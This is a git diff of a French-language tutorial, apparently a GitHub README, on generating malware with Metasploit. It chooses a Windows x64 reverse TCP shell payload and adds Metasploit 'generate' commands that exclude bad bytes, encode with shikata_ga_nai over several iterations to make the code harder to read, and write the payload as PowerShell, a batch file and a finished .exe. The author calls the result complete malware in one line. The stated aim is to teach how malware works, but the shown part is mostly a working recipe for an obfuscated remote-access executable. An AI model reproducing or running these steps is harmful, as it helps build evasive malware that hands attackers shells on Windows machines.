@@ -109,7 +109,9 @@ use payload/windows/x64/shell_reverse_tcp
 ````
 il va creer  un shell Windows via une connexion TCP inverse.
 
-puis : 
+# A partir de maintenant  toutes les commande ici serviront a comprendre le fonctionnement des malawrs car en une seul ligne cela suffit a creer le malwar.
+
+regarder les option : 
 
 ````bash
 options
@@ -119,6 +121,7 @@ ouvrez un nouveau terminal et taper :
 ````bash
 ifconfig
 ````
+
 critquez pas svp -__-
 
 <img width="1920" height="922" alt="645845784-a7ac75af-2cea-4be0-bde2-e76bb0a98350" src="https://github.com/user-attachments/assets/48f4b797-0399-4a39-b506-f8b88090e2f5" />
@@ -146,13 +149,13 @@ generate -h
 ````bash
 generate -b \x00\xff
 ````
-## puis on va choisir l encoder le playload :
+## puis on va choisir l encoder du playload :
 
 ````bash
 generate -h
 show encoders
 ````
-## endons en shikataganai !:
+## encodons en shikataganai !:
 
 ````bash
 generate -e x86/shikata_ga_nai
@@ -170,14 +173,30 @@ generate -e x86/shikata_ga_nai -b \xff
 generate -e x86/shikata_ga_nai -b \xff -f powershell
 ````
 
+## format bat :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff -f bat
+````
+
 ## double iteration pour rendre la lecture du code plus difficile :
 
 ````bash
 generate -e x86/shikata_ga_nai -b \xff -i 2 -f powershell
 ````
-# vous devriez finir avec ceci 
 
-<img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/6469b961-d96a-44dc-86af-f57f6b9e0972" />
+ajouter un chemin de fichier pour creer le fichier :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f powershell
+````
+format exe malwar complet en une ligne :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f exe
+````
+
+## c est fini on peut toujours rajouter plus d iteration y a d autre format , encoder, forme,option ,playload possible explorer tout 👍
 
 # maintenant nous allons utiliser msfvemon , tout d abord comprenons ce que c est :
 
